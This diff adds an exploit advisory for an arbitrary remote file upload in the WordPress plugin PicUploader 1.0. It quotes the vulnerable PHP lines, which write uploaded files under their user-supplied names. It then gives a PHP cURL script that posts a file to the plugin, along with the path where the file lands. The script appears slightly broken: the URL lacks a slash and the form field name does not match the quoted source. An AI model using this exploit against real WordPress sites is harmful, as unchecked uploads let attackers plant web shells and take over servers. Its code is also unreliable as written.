@@ -1,0 +1,39 @@
+* Exploit Title: Wordpress Plugin PicUploader 1.0 - Remote File Upload
+* Google Dork: N/A
+* Date: 2020.03.22
+* Exploit Author: Milad Karimi
+* Vendor Homepage: https://github.com/xiebruce/PicUploader
+* Software Link: https://github.com/xiebruce/PicUploader
+* Category : webapps
+* Version: 1.0
+* Tested on: windows 10 , firefox
+* CVE : N/A
+
+Vulnerable Source:
+    88: move_uploaded_file move_uploaded_file($tmp_name, $dest))
+    86: foreach($files['tmp_name'] as $key=>$tmp_name)
+    80: $files = $_FILES['file']){
+    72: $_FILES['file'] = $_FILES[$plugin];  // if(isset($_FILES)), 
+    87: $dest = $tmpDir . '/' . $files['name'][$key]; 
+    81: $tmpDir = APP_PATH . '/.tmp'; 
+    24: define('APP_PATH', strtr(__DIR__, '\\', '/'));  // define() 
+    80: $files = $_FILES['file']){
+    72: $_FILES['file'] = $_FILES[$plugin];  // if(isset($_FILES)), 
+    80: if(isset($_FILES['file']) && $files = $_FILES['file'])
+    84: if(is_array($files['tmp_name']))
+
+Exploit:
+<?php
+$shahab="file.jpg";
+$ch = curl_init("http://localhost/wordpress/wp-content/pluginsPicUploader-master/index.php");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+array('zip'=>"@$shahab"));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($ch);
+curl_close($ch);
+print "$result";
+?>
+
+Location File:
+http://localhost/wordpress/wp-content/plugins/PicUploader/file.jpg
